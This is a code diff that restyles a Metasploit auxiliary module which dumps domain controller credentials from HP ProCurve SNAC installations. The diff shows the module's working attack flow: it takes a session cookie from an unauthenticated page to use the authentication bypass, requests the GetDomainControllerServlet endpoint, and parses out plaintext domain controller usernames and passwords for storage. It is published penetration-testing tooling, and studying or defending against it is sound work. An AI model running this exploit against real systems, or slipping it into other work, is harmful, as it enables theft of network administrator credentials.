@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,69 +8,60 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'HP ProCurve SNAC Domain Controller Credential Dumper',
-      'Description'    => %q{
-        This module will extract Domain Controller credentials from vulnerable installations of HP
-        SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability
-        has been used to exploit remote file uploads. This vulnerability can be used to gather important
-        information handled by the vulnerable application, like plain text domain controller
-        credentials. This module has been tested successfully with HP SNAC included with ProCurve
-        Manager 4.0.
-      },
-      'References'     =>
-        [
-          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03897409']
-        ],
-      'Author'         =>
-        [
-          'rgod <rgod[at]autistici.org>', # Auth bypass discovered by
-          'juan vazquez' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
-          'SSL' => true,
-        },
-      'DisclosureDate' => "Sep 09 2013"
-    ))
+                      'Name'           => 'HP ProCurve SNAC Domain Controller Credential Dumper',
+                      'Description'    => %q(
+                        This module will extract Domain Controller credentials from vulnerable installations of HP
+                        SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability
+                        has been used to exploit remote file uploads. This vulnerability can be used to gather important
+                        information handled by the vulnerable application, like plain text domain controller
+                        credentials. This module has been tested successfully with HP SNAC included with ProCurve
+                        Manager 4.0.
+                      ),
+                      'References'     =>
+                        [
+                          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03897409']
+                        ],
+                      'Author'         =>
+                        [
+                          'rgod <rgod[at]autistici.org>', # Auth bypass discovered by
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' =>
+                        {
+                          'SSL' => true
+                        },
+                      'DisclosureDate' => "Sep 09 2013"))
 
     register_options(
       [
         Opt::RPORT(443)
-      ], self.class)
+      ], self.class
+    )
   end
 
   def get_domain_info(session)
-    res = send_request_cgi({
-      'uri' => "/RegWeb/RegWeb/GetDomainControllerServlet",
-      'cookie' => session
-    })
+    res = send_request_cgi('uri' => "/RegWeb/RegWeb/GetDomainControllerServlet",
+                           'cookie' => session)
 
-    if res and res.code == 200 and res.body =~ /domainName/
-      return res.body
-    end
+    return res.body if res && (res.code == 200) && res.body =~ /domainName/
 
-    return nil
+    nil
   end
 
   def get_session
-    res = send_request_cgi({ 'uri' => "/RegWeb/html/snac/index.html" })
+    res = send_request_cgi('uri' => "/RegWeb/html/snac/index.html")
     session = nil
-    if res and res.code == 200
-      session = res.get_cookies
-    end
+    session = res.get_cookies if res && (res.code == 200)
 
-    if session and not session.empty?
-      return session
-    end
+    return session if session && !session.empty?
 
-    return nil
+    nil
   end
 
   def parse_domain_data(data)
@@ -85,9 +77,8 @@ class MetasploitModule < Msf::Auxiliary
       results << [dc_ip, port, service, user, password]
     end
 
-    return results
+    results
   end
-
 
   def report_cred(opts)
     service_data = {
@@ -115,9 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-
   def run
-
     print_status("Get Domain Info")
     session = get_session
 
@@ -162,6 +151,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_line
     print_line(cred_table.to_s)
-
   end
 end
